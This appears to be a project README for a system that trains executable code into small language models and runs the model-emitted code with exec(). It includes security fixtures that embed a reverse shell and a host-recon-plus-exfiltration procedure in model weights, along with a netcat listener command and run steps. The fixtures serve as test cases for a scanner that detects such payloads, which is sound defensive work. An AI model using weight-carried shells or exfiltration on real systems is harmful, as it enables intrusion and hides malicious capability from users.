# Nocode — Model-Carried Logic

> **The model carries the code.** A grammar's executable logic is transposed into trainable tokens,
> embedded in the model, emitted at inference, and run by a grammar-agnostic runner — so the CPU side
> needs **no per-grammar code**. Infrastructure required at runtime: the runner, Ollama, and the model.

This is the evolution of the grammar-LM solution (see the main [README](../README.md)). The baseline
runs a grammar's logic from **hand-written CPU code** — either the hardcoded `GrammarRunner.evaluate()`
(expression grammars) or a side-car command vocabulary looked up at runtime (procedure grammars).
**Nocode inverts that coupling**: the logic is lifted into the model as `(prompt → body)` training
anchors, and at inference the model emits the body which a generic runner executes.

```
baseline:   grammar ──> CPU code (hardcoded / side-car) ──> result
nocode:     grammar ──> model carries the logic ──> model emits body ──> nocode_runner runs it ──> result
```

---

## Architecture & the automata model

**No Turing machine had to be built.** The execution substrate already exists — Python's `exec()` is a
universal (Turing-complete) machine. The nocode design simply makes the **model the program source**
for it, gated by the exec policy. Mapping the runner onto automata theory:

| Layer | Machine class | In the runner |
|---|---|---|
| Tokenize input | Finite automaton (regular) | `_tokenize_input` (regex) |
| Parse structure | **Pushdown automaton** (context-free / BNF) | recursive-descent `_parse_rule` (left-recursion via iterative extension) |
| Execute logic | **Turing-complete** (stored program) | `exec(body)` — the body is supplied **by the model at runtime** |

So the grammar/parse is a PDA over a context-free grammar; the *logic* is a stored program the model
emits into a universal interpreter. That stored-program-from-the-model idea is the Post-Turing flavour
the design leans on — the runner is the universal machine, the model is the program store.

### Baseline vs nocode (the inversion)

```mermaid
flowchart LR
    G[Grammar] --> B{which path?}
    B -->|baseline| CPU["hand-written CPU code<br/>hardcoded evaluate / side-car dict"] --> R1[result]
    B -->|nocode| M["model carries the logic"] --> E["model emits body"] --> RUN["nocode_runner executes"] --> R2[result]
```

### Runtime flow (parse = PDA, execute = universal machine)

```mermaid
flowchart TD
    IN["user input<br/>3 + 4  |  fibonacci"] --> LEX["tokenize<br/>(finite automaton)"]
    LEX --> DET{auto-detect}
    DET -->|expression| PARSE["recursive-descent parse<br/>(pushdown automaton / CFG)"]
    DET -->|command name| WALK["walk procedure tree"]
    PARSE --> TREE["parse tree"]
    TREE --> NODE["per node: which op?"]
    WALK --> TOK["per terminal: which token?"]
    NODE --> SRC{"source body<br/>(exec policy)"}
    TOK --> SRC
    SRC -->|generative| ASK["query model: 'grammar token'"]
    ASK --> OLL[("Ollama model<br/>carries the code")]
    OLL --> BODY["emitted body"]
    SRC -->|token_select| VOC["carried vocab"]
    BODY --> EXEC["exec(body)<br/>(Turing-complete)"]
    VOC --> EXEC
    EXEC --> RES["result / side-effects"]
```

### Build pipeline (transpose → review → train)

```mermaid
flowchart LR
    L["CPU logic<br/>class methods / command bodies"] --> TR["LogicTransposer<br/>(AST, no import)"]
    TR --> REV{"code review<br/>240ch / 6ln"}
    REV -->|within budget| FV["function_vocabulary"]
    REV -->|factorable| DEC["decompose → small op tokens"] --> FV
    REV -->|atomic big| CH["chunk [[CONT]]/[[END]]"] --> FV
    FV --> HOOK["train hook<br/>+ dynamic capacity"] --> MODEL[("model in Ollama")]
```

---

## Pieces

| Component | File | Role |
|---|---|---|
| **LogicTransposer** | [`scripts/classes/class_logic_transposer.py`](../scripts/classes/class_logic_transposer.py) | Lift working CPU logic into a `function_vocabulary` (AST, no import) |
| **emit CLI** | [`scripts/model_generation/emit_logic_vocab.py`](../scripts/model_generation/emit_logic_vocab.py) | `--review`, `--decompose`, `--print`, `--selftest` |
| **Training hook** | [`scripts/model_generation/model_create_hf_cl.py`](../scripts/model_generation/model_create_hf_cl.py) | Trains `function_vocabulary` bodies as anchors + dynamic capacity |
| **NoCodeGrammarRunner** | [`scripts/classes/class_nocode_grammar.py`](../scripts/classes/class_nocode_grammar.py) | Sources each body from the model per exec policy; continuity reassembly |
| **nocode runner** | [`scripts/nocode_runner.py`](../scripts/nocode_runner.py) → [`class_nocode_runner.py`](../scripts/classes/class_nocode_runner.py) | Host CLI; auto-detects expression vs command; `--policy` |
| **regression gate** | [`scripts/model_generation/nocode_verify_calc.py`](../scripts/model_generation/nocode_verify_calc.py) | Live 3-policy verify (exits non-zero on failure) |

The proven `GrammarRunner` / `model_runner.py` baseline is **left intact** — nocode is an additive
parallel track (`NoCodeGrammarRunner` subclasses `GrammarRunner`).

## The function vocabulary

A superset of the existing `command_vocabulary` schema. Unlike command vocabularies (which are *not*
trained — only loaded as a side-car), `function_vocabulary` bodies **are** trained as
`("<grammar> <token>" → body)` anchors, so the model learns to emit them.

```json
{
  "_type": "function_vocabulary",
  "_grammar": "calculator",
  "_exec": "python",
  "_mode": "evaluate_ops",
  "number": "result = int(''.join(str(d) for d in digits if isinstance(d, (int, float))))",
  "op_add": "result = a + b",
  "op_sub": "result = a - b",
  "op_mul": "result = a * b",
  "op_div": "result = a // b if b != 0 else None"
}
```

`_mode` selects how the runner applies the bodies:

| `_mode` | Used by | The runner… |
|---|---|---|
| `evaluate` | expression grammars (whole evaluator) | sources one `evaluate(node)` body and applies it to the parse tree |
| `evaluate_ops` | expression grammars (decomposed) | walks the parse tree; sources each node's compute (`op_add`, `number`, …) from a small token |
| `execute` | procedure grammars | walks the grammar; runs each terminal token's body (`_exec` = `python` or `shell`) |

## Exec policy ladder

How literally "the model pushes the code" is a runtime policy (`--policy` / `/policy`):

| Policy | Body source | Use |
|---|---|---|
| `token_select` | carried vocabulary only (≈ baseline) | deterministic regression oracle |
| `vocab_verified` | model emits; fall back to the verified body on drift | safe default |
| `generative` | the model-emitted body is executed directly | the destiny — no CPU-side code |

## Keeping the logic small enough to carry

A tiny model can't memorize or emit an arbitrarily large body in one window (`NUM_PREDICT`). Three
composable levers handle this, **routed by the code-review gate** (`LogicTransposer.review`, budget
240 chars / 6 lines):

```
review(token)
  ├─ within budget           → train/emit as-is
  ├─ over budget, factorable → DECOMPOSE into small precise tokens (per-operator)   [evaluate_ops]
  └─ over budget, atomic     → CHUNK with [[CONT]]/[[END]]; runner reassembles whole [continuity]
```

- **Decomposition** — split a too-generic function into small precise tokens (the calculator's monolithic
  `evaluate` → `op_add`/`op_sub`/`op_mul`/`op_div`/`number`, 14–76 chars each).
- **Continuity** — for an atomic body that shouldn't be split, emit ordered `[[CONT]]`/`[[END]]` chunks
  (`<token>`, `<token> §1`, …); the runner re-queries on `[[CONT]]` and reassembles the **complete** body
  before executing.
- **Dynamic capacity** — the build sizes depth / context / `num_predict` to the longest body trained in
  (`dynamic_capacity`): small grammars stay lean (calculator: 2 layers, `num_predict` 64), bigger logic
  grows (pyhealthcheck: 4 layers, `num_predict` 179).

## Usage

```bash
source venv/bin/activate

# 1. Transpose a grammar's CPU logic into a trainable function vocabulary
python3 scripts/model_generation/emit_logic_vocab.py --grammar calculator --decompose --review

# 2. Train it into a model (the grammar meta now declares the functions file)
python3 scripts/model_generation/model_create_hf_cl.py --build-only \
    --name model_calculator_nocode_v1 --grammar models/grammars/playbook_model_calculator.txt

# 3. Run it — the model supplies the logic; nocode_runner executes it
python3 scripts/nocode_runner.py --mode host \
    --grammar models/grammars/playbook_model_calculator.txt \
    --model model_calculator_nocode_v1 --policy generative
```

At the `nocode>` prompt the runner **auto-detects** the input:

```
nocode> 3 + 4                 # expression  → evaluate-mode → Result: 7
nocode> fibonacci             # command name → execute-mode → runs the procedure
```

In `generative` policy the logs show each body fetched from the model, e.g.
`[model body] calculator op_add -> 14 char(s)` then executed.

## CLI & REPL reference

### `nocode_runner.py` — run a model-carried grammar

```bash
python3 scripts/nocode_runner.py [--mode host] [--model MODEL] [--grammar FILE ...] \
                                 [--policy POLICY] [--host URL]
```

| Flag | Values | Default | Description |
|------|--------|---------|-------------|
| `--mode` | `host` / `device` | `host` | `host` = CPU logic from the model; `device` deferred |
| `--model` | Ollama model name | **script name** (`nocode_runner`) | the model that carries the logic (the oracle) |
| `--grammar` | one or more files (bare name or path) | from the model's `state.json` | grammars to load; multiple are merged (composition) |
| `--policy` | `token_select` / `vocab_verified` / `generative` | `vocab_verified` | where each body comes from |
| `--host` | URL | env / `localhost:11434` | Ollama host |

Omit `--grammar` to auto-load the model's own grammars; omit `--model` to use the script-named default.

### In-session (REPL) commands

| Input | Action |
|-------|--------|
| `<expression>` (e.g. `3 + 4`) | parsed + **evaluated** against the loaded expression grammar |
| `<grammar>` (e.g. `fibonacci`) | **executes** the grammar's procedure — descends into its functions (auto-routed) |
| `<function>` (e.g. `fib_sequence`) | run ONE function directly **by name** |
| `<grammar>/<function>` (e.g. `recon_exfil/gather_host`) | run a function **by playbook path** — fetches the body under that grammar's namespace (disambiguates a token shared by two grammars) |
| `<command> <arg…>` (e.g. `revshell_param 10.0.0.5 4444`) | pass prompt **arguments** (`args[0]`, `args[1]`, …) |
| `/policy [mode]` | show or set the exec policy (reloads the backend) |
| `/grammar [file ...]` | show loaded grammars/rules, or switch/merge grammar files |
| `/set <key> <val>` | set `model` / `grammar` / `host` / `policy` |
| `/create` · `/export` | retrain the host model · export to CPU ONNX |
| `/?` · `/bye` (`exit`,`quit`) | help · quit |
| `TAB` · `↑`/`↓` | completion **grouped by grammar** — each candidate shows its **arg signature** (`<ip> <port>`) and **callable sub-functions**; also completes `grammar/` paths · history |

### `emit_logic_vocab.py` — transpose CPU logic → function vocabulary

```bash
python3 scripts/model_generation/emit_logic_vocab.py --grammar <name> [--decompose] [--review] [--print] [--selftest]
python3 scripts/model_generation/emit_logic_vocab.py --list
```

| Flag | Description |
|------|-------------|
| `--grammar <name>` | grammar to transpose (`--list` shows the registered specs) |
| `--decompose` | emit small per-operation tokens instead of the whole function |
| `--review` | code-review the bodies (flag over-budget tokens → decompose/chunk) |
| `--print` / `--selftest` / `--list` | print vocab / verify offline (calculator) / list specs |

### `model_create_hf_cl.py` — build / upgrade / fork a model

```bash
python3 scripts/model_generation/model_create_hf_cl.py --build-only --name <model> \
        [--grammar FILE ...] [--train FILE ...] [--from <model>] [--warm]
```

| Flag | Description |
|------|-------------|
| `--name <model>` | output model (folder under `models/generated/transformer/` + Ollama name) |
| `--grammar` / `--train` | grammar file(s) / knowledge files to train in |
| `--from <model>` | **fork**: seed from an existing model's state, then add `--grammar`/`--train` |
| `--warm` | **warm-start** weights from the restored model (upgrade without training from scratch) |
| `--max-epochs N` | cap training epochs (default 800) — register a usable model fast on a slow CPU / heavy corpus (pairs with `--warm`) |
| `--target-loss L` | stop at loss < L (default `5e-4`) — loosen for a faster, good-enough model |
| `--build-only` | train → export GGUF → register with Ollama → exit (no REPL) |
| `--arch <family>` | base architecture for an **empty** build: `qwen2` (default) · `qwen3` · `llama` · `mistral`. Inherited automatically by `--from`/`--warm` (the source model's `model_type`). |

Re-run with the same `--name` + new `--grammar` to **upgrade in place** (restores state, trains the union).

## Composition — grammars calling grammars (multi-grammar model)

Grammars are composable: one can **call others** by referencing their root rules, and a single model
can carry **many** grammars at once. `nocode_runner --grammar` takes multiple files; their rules +
bodies merge into one playbook with an **owner map**, so each body is emitted under the namespace it
was trained with.

```bnf
# playbook_combo.txt — a grammar that orchestrates two others (no tokens of its own)
<combo> ::= <fibonacci> <greeting>
```

```bash
# one model carrying combo + fibonacci + greeting
python3 scripts/model_generation/model_create_hf_cl.py --build-only --name model_combo_nocode_v1 \
    --grammar models/grammars/playbook_combo.txt \
              models/grammars/playbook_fibonacci.txt \
              models/grammars/playbook_greeting.txt

# run all three from ONE runner + ONE model; type any grammar name (auto-detected)
python3 scripts/nocode_runner.py --mode host --model model_combo_nocode_v1 --policy generative \
    --grammar playbook_combo.txt playbook_fibonacci.txt playbook_greeting.txt
nocode> combo        # descends: fibonacci (sequence + ratio) then greeting — each body FROM the model
```

**Proven live**: `model_combo_nocode_v1` emits `fibonacci fib_sequence`, `fibonacci fib_ratio`,
`greeting say_hello` verbatim; `nocode> combo` under `generative` descends through both child grammars,
sourcing each body from the model under its **owner namespace** (`fibonacci fib_sequence`, not
`combo fib_sequence`).

**Caveats (designed for)**: rule-name collisions across grammars → namespacing; `evaluate_ops` vs
`execute` mode is per-grammar; deep recursion needs a call-depth guard.

**TAB + history**: the runner provides readline TAB completion and persistent history
(`~/.nocode_runner_history`). On TAB the candidates are **grouped by grammar** (so a many-grammar
model stays navigable), and each shows its **argument signature** (parsed from `args[N]` in the body,
e.g. `revshell_param  <ip> <port>`) and its **callable sub-functions** (e.g. `recon_exfil → gather_host,
exfil_to_localhost`). Typing `<grammar>/` then TAB lists that grammar's functions; selecting one runs
it specifically. As you type a prefix or a path, the list narrows and re-groups. Also completes
`/policy` values and `/set` keys.

## Function arguments & data flow

Grammar functions take **arguments** and **pass data to one another** via a shared execution context
(`NoCodeGrammarRunner.execute(start_rule, args)`):

- **Prompt arguments** — words typed after the grammar name are bound as `args` (list) and `arg0`,
  `arg1` ... in every body's namespace, so a tool's *target* can come from the operator at call time:
  ```
  nocode> revshell_param 10.0.0.5 4444     # args[0]=10.0.0.5, args[1]=4444 — logic in the model, target at the prompt
  ```
- **Inter-function data flow** — as each token body runs, its `result` is captured under the token
  name, so a later body reads what an earlier one gathered (autonomous gather → inject):
  ```bnf
  <recon_exfil> ::= <gather_host> <exfil_to_localhost>
  ```
  `gather_host` sets `result = {...}`; the runner injects it; `exfil_to_localhost` reads `gather_host`.
- **Shell mode** exposes context scalars as `$nc_<name>` env vars and captures stdout for downstream.

This unifies the modes: `evaluate_ops` already threaded `a`/`b → result` up the parse tree; execute-mode
now threads function outputs along a procedure. Proven offline (`dataflow_demo <label>`): the prompt
arg flows into `gather`, then `consume` reads `gather`'s output.

## Per-model config, default model & upgrading

**`--model X` alone is enough.** Each model records the grammars it was built with in its
`models/generated/transformer/<X>/<X>.state.json` (the playbook). When `--grammar` is omitted the
runner reads that state and **auto-loads the model's own grammar(s)** — no need to re-specify them:

```bash
python3 scripts/nocode_runner.py --mode host --model model_combo_nocode_v1
# per-model config: model_combo_nocode_v1.state.json -> playbook_combo.txt, playbook_fibonacci.txt, playbook_greeting.txt
```

**Default model = the script name.** Plain `python3 scripts/nocode_runner.py` uses the model named
after the script (`nocode_runner`) — build a model called `nocode_runner` to make it the default.
Resolution priority: `--model` > config-file `model` > script-named default. Grammar priority:
`--grammar` > the model's `state.json` > config-file default.

**Upgrading an existing model.** Re-run the builder with the SAME `--name` plus new `--grammar` /
`--train` files: the saved state is restored and the new content is added on top, then retrained on
the **union** (joint retraining is catastrophic-forgetting-proof). The `state.json` updates, so the
runner auto-loads the expanded grammar set next time.

```bash
# add kali_discovery to an existing model (restores state, adds, retrains the union)
python3 scripts/model_generation/model_create_hf_cl.py --build-only \
    --name model_combo_nocode_v1 --grammar models/grammars/playbook_kali_discovery.txt
```

**Forking a new model from an existing one (`--from`).** Seed a brand-new model from an existing
model's state (its grammars + knowledge), then add grammars on top — the source model is untouched:

```bash
# nocode_runner = model_combo_nocode_v1 (combo+fibonacci+greeting) + revshell_localhost
python3 scripts/model_generation/model_create_hf_cl.py --build-only \
    --name nocode_runner --from model_combo_nocode_v1 \
    --grammar models/grammars/playbook_revshell_localhost.txt
```

`--from` restores `<source>.state.json` but saves under `--name`; combined with the script-named
default, `nocode_runner` then loads all four grammars on a plain `python3 scripts/nocode_runner.py`.

> Caveat: keep an upgrade/fork within one execution mode — mixing `evaluate_ops` (expression) and
> `execute` (procedure) grammars in one model means the runner selects a single mode for the set.

## Model creation: sources & architectures

> **Status (branch `multimodel-arch`):** ① empty (`--arch`) and ② existing-ours (`--from`/`--warm`,
> arch inherited) are **live across all four families** — `qwen2` (default) · `qwen3` · `llama` ·
> `mistral` — via the `ARCH_PROFILES` registry below. ③ external-open (`--from-external`) is the
> remaining step. **All four archs build + LOAD in Ollama** (`revshell_param` matrix verified); the
> qwen3/mistral export needed per-arch GGUF fixes — see *GGUF loadability* below. Emission quality
> tracks training depth — `vocab_verified` guards any under-trained arch (drift → verified body).

A model is created from one of **three sources** — the source decides how much the user must specify,
because the architecture + template (the "essential information") is either chosen, inherited, or
auto-read:

| Source | Meaning | How | Arch + template come from |
|--------|---------|-----|---------------------------|
| **① empty** | scratch / cold build | default (no `--from*`) | the **user** picks `--arch` (nothing to inherit) |
| **② existing — ours** | warm / fork one of our own models | `--from <model>` / `--warm` | **inherited** from the model's `state.json` |
| **③ existing — external open** | start from a real pretrained Qwen3 / Llama / Mistral | `--from-external <hf-id\|path>` | **auto-read** from the checkpoint (`config.json` + tokenizer) |

The source can be asked interactively at creation, or **inferred** from which flag is given
(`--arch` → ①, `--from` → ②, `--from-external` → ③). Only ① needs the user to state the architecture;
② inherits it, ③ auto-detects it from the self-describing checkpoint.

### Architecture profiles — the only "essential information" (and only for ①)

Creation is hardwired to Qwen2 today (classes, special token, template, pre-tokenizer,
`attention_bias`). The evolution extracts these into an `ARCH_PROFILES` registry keyed by `--arch`:

| Field | qwen2 (default) | llama | mistral | used at |
|-------|-----------------|-------|---------|---------|
| HF classes | `Qwen2*` | `Llama*` | `Mistral*` | creation |
| boundary token (bos/eos/pad) | `<\|endoftext\|>` | `<\|begin_of_text\|>` / `<\|eot_id\|>` | `<s>` / `</s>` | creation |
| Modelfile `TEMPLATE` | `<\|endoftext\|>{{ .Prompt }}` | arch-specific | arch-specific | **creation only** |
| pre-tokenizer | `qwen2` | `llama-bpe` | … | creation |
| `attention_bias` | `true` | `false` | `false` | creation |
| GQA kv-head ratio | per arch | per arch | per arch | creation |

**GQA (grouped-query attention) is already in the pipeline** — it is `num_key_value_heads` in the
config — so multi-arch support inherits it for free; there is nothing GQA-specific to implement.
Layers/dims keep auto-growing via `dynamic_capacity`; a profile only sets the head config + the
strings above. `--arch qwen2` stays the default, so existing builds are unchanged.

### GGUF loadability — the per-arch export fixes

Tagging the GGUF with the HF `model_type` is not enough — each family's llama.cpp loader has its own
requirements (`export_gguf` in `class_model_assets.py`):

| Arch | Why it failed to load | Fix |
|------|-----------------------|-----|
| **qwen3** | `head_dim` (128) is decoupled from `hidden//n_head` (64) — the loader derives the wrong head_dim and the load aborts | emit `qwen3.attention.key_length`/`value_length` from `config.head_dim`; map the `q_norm`/`k_norm` (qk-norm) tensors |
| **mistral** | structurally identical to Llama (same 30 tensors) but the legacy llama.cpp engine has no separate `mistral` loader | ship it under the `llama` arch tag |

**Patch an already-trained model without retraining** — `scripts/model_generation/gguf_arch_fix.py`
rewrites a trained GGUF's arch metadata (inject `key/value_length`, rename the arch prefix), then
`ollama create -f Modelfile` re-registers it. This matters on an **AVX-only CPU**: qwen3 retraining
hits an AVX2 kernel and **SIGILLs** — retrain with `ATEN_CPU_CAPABILITY=default` (scalar, slower) to
avoid it, or just patch the existing blob.

### ③ external — the one scale decision

"From an external open model" has two flavors; pick deliberately:
- **③a adopt-and-shrink** — take the external arch + tokenizer + template, but still train a *tiny*
  from-scratch net (embeddings initialized by token-string). Stays ~8 MB. Generalizes today's
  `--warm` (which already calls `from_pretrained`) — it just unlocks non-Qwen2 classes.
- **③b real fine-tune** — train the grammar anchors on top of the real pretrained weights at full
  size (0.6B–1B). Genuinely capable, real compute. A separate opt-in track.

## Model depth & capacity (layers)

The model is not a fixed size — its **depth** (neural layers), emission window (`num_predict`) and
context are sized to the **logic it must carry**, by `dynamic_capacity()` (in `model_create_hf_cl.py`)
at build time:

```
layers       = NUM_LAYERS(2) + longest_body_tokens // 64      (capped at 8)
num_predict  = max(64, longest_body_tokens + 24)              (capped by context)
context      = max(256, longest_full_example_tokens + 24)
```

Depth is derived from **content against a FIXED base** (`NUM_LAYERS`), *not* the restored/grown arch —
so it is **idempotent**: the same grammars always yield the same depth. That matters for two reasons:

1. **Forks/upgrades don't compound layers** — re-forking a model (`--from`) used to add one layer each
   time (it based depth on the already-grown source); now it stays stable.
2. **Warm-start covers every layer** — because the depth matches the source, `--warm` can copy *all*
   the source's layer tensors (no fresh layer left to learn from scratch), so an upgrade converges from
   what was already learned instead of from random init.

```mermaid
flowchart TD
    BODIES["transposed function bodies<br/>longest body (tokens)"] --> DC{{"dynamic_capacity()"}}
    DC --> DEPTH["layers = 2 + longest // 64  (max 8)"]
    DC --> WIN["num_predict = max(64, longest + 24)"]
    DC --> CTX["context = max(256, longest_example + 24)"]
    DEPTH --> MODEL["Qwen2 model (depth = layers)"]
    WIN --> MODEL
    CTX --> MODEL
    SRC[("source model<br/>(--from)")] -. "--warm: copy embeddings by token-string<br/>+ ALL layer tensors (depth idempotent)" .-> MODEL
    MODEL --> TRAIN["fine-tune the union → model carries the logic"]
```

| Grammar set | longest body | layers | num_predict |
|---|---|---|---|
| calculator ops (decomposed) | ~21 tok | 2 | 64 |
| fibonacci / greeting | ~73 tok | 3 | 97 |
| pyhealthcheck (big bodies) | ~155 tok | 4 | 179 |

Small grammars stay lean (2 layers / 64); bigger logic grows depth + window; a warm fork/upgrade
reuses the source's layers. Levers: `PREDICT_MARGIN`, `TOKENS_PER_EXTRA_LAYER`, `MAX_DYN_LAYERS` in
`model_create_hf_cl.py`.

## Verification

```bash
python3 scripts/model_generation/emit_logic_vocab.py --grammar calculator --selftest   # offline
python3 scripts/model_generation/nocode_verify_calc.py model_calculator_nocode_v1       # live, 3 policies
```

## Proven

| Grammar | Path | Result |
|---|---|---|
| **calculator** | `evaluate_ops`, `_exec=python` | **live, all 3 policies 6/6** incl. `generative` (model emits each op body verbatim; runner computes `2+3*4=14`, `9-2-3=4`) |
| **fibonacci** | `execute`, `_exec=python` | **live generative** — model emits `fib_sequence`/`fib_ratio` (exact==vocab), runner prints `0 1 1 2 … 377` + golden ratio |
| **kali_discovery** | `execute`, `_exec=shell` | resolution proven (no scans executed by design) |
| **pyhealthcheck** | `execute`, `_exec=python` | offline proven; live model is convergence-limited (155-tok bodies) — use `vocab_verified` or decompose |
| **revshell_localhost** | `execute`, `_exec=python` | **live** — model carries the reverse-shell payload **verbatim** (74-tok body; dynamic growth bumped `num_predict` to 98); security fixture (below) |
| **combo** (→ fibonacci, greeting) | `execute`, composition | **live** — one model carries 3 grammars; `nocode> combo` generatively descends into both child grammars (each body emitted under its owner namespace) |
| **revshell_param** | `execute`, prompt args | **live** — parameterized reverse shell; target `<ip> <port>` from prompt args (`args[0]`/`args[1]`), logic in the model; scanner → `MALICIOUS-CONTENT` |
| **recon_exfil** | `execute`, data flow | **live** — `gather_host` → `exfil_to_localhost` (reads the gathered data); inter-function data flow; scanner → `data_exfil` |
| **dataflow_demo** | `execute`, data flow | **offline** — prompt arg + `gather` → `consume` (reads `gather`'s output); proves args + data flow safely |

## Security fixtures — capabilities carried in a model

These nocode **tools** are positive controls for the Model Security RE scanner: the logic (a payload)
lives **inside the model**, not on the CPU side, so they close the loop — *nocode carries the
capability, security RE detects it.*

| Fixture | Capability | Scanner verdict |
|---|---|---|
| `revshell_localhost` | reverse TCP shell to `127.0.0.1:1234` | `MALICIOUS-CONTENT` (`py_reverse_shell`) |
| `revshell_param` | reverse shell, target `<ip> <port>` from **prompt args** | `MALICIOUS-CONTENT` (`code_exec` + `py_reverse_shell`) |
| `recon_exfil` | gather host data → **exfil** it (inter-function **data flow**) | `MALICIOUS-CONTENT` (`data_exfil`) |

> **Controlled local lab fixtures** — run only against your own host (`nc -lvnp <port>`). No remote
> target. The build trains the payload into the weights; it is not executed at build time.

**The scanner is nocode-aware** (`scripts/model_security/`): it reconstructs the payload bodies from
the **weights** in the trained `"<grammar> <token>"` namespace (the payload isn't in the metadata),
marks nocode models **dynamic-mandatory**, scans the recovered bodies for `code_exec` /
`py_reverse_shell` / `data_exfil`, flags an added exec-capable body as **TAMPERED** (integrity), and
prints the decoded payload as the **evidence line** under the verdict.

```bash
# 1. listener (your terminal)
nc -lvnp 1234

# 2. run the model-carried tool  (--grammar takes a bare filename OR a full path)
python3 scripts/nocode_runner.py --mode host \
    --grammar playbook_revshell_localhost.txt \
    --model model_revshell_localhost_v1 --policy token_select
nocode> revshell_localhost          # fires the payload -> shell on your netcat

# token_select runs the exact verified payload; generative pulls it FROM the model
# (the model emits the 220-char payload verbatim, so both work).

# 3. security detection — the SAME model is now a positive test case
python3 scripts/model_security_re.py analyze --ollama model_revshell_localhost_v1 --dynamic
# expected verdict: EXECUTABLE-CAPABILITY   (vs the calculator's INERT)
```

## Roadmap

- **Multi-grammar model + composition** — ✅ done: one model carries several grammars, the runner
  loads + merges them, auto-detects expression-vs-command, and grammars call other grammars (see
  Composition above). Per-grammar lean models remain the option for constrained host/NPU.
- **NPU path** — embed/train the function bodies into the TCN model so the device emits logic too.
- **More target languages** — Go / bash / CLI via the same `_exec` mechanism.
